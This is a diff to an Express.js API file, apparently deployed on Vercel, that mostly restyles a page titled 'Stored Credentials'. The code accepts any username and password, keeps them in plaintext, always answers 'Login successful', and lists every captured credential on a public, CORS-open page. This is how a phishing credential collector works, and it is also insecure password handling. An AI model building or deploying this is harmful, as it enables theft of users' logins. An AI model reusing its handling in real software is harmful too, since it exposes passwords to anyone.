@@ -1,24 +1,43 @@
-// api/index.js
 const express = require('express');
 const cors = require('cors');
+
 const app = express();
 
 // Store credentials in memory (for demonstration only)
-// In a real application, you would use a proper database
+// In a real application, you should use a database
 let credentials = [];
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 
-// Serve a simple HTML page to display credentials
+// Serve a visible HTML page with stored credentials
 app.get('/api', (req, res) => {
   const html = `
     <!DOCTYPE html>
-    <html>
+    <html lang="en">
       <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Stored Credentials</title>
         <style>
+          body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 20px;
+            background-color: #f4f4f4;
+          }
+          .container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+          }
+          h1 {
+            text-align: center;
+          }
           table {
             width: 100%;
             border-collapse: collapse;
@@ -26,19 +45,15 @@ app.get('/api', (req, res) => {
           }
           th, td {
             border: 1px solid #ddd;
-            padding: 8px;
+            padding: 10px;
             text-align: left;
           }
           th {
-            background-color: #f2f2f2;
+            background-color: #007BFF;
+            color: white;
           }
           tr:nth-child(even) {
             background-color: #f9f9f9;
-          }
-          .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
           }
         </style>
       </head>
@@ -73,22 +88,22 @@ app.get('/api', (req, res) => {
 // Handle login requests
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
-  
+
   // Basic validation
   if (!username || !password) {
     return res.status(400).json({ message: 'Username and password are required' });
   }
-  
+
   // Store the credentials with timestamp
   credentials.push({
     username,
     password,
     timestamp: new Date().toLocaleString()
   });
-  
+
   // Send success response
-  res.json({ message: 'Login successful' });
+  res.json({ message: 'Login successful!' });
 });
 
-// Export the Express API
+// Export the Express API for Vercel
 module.exports = app;
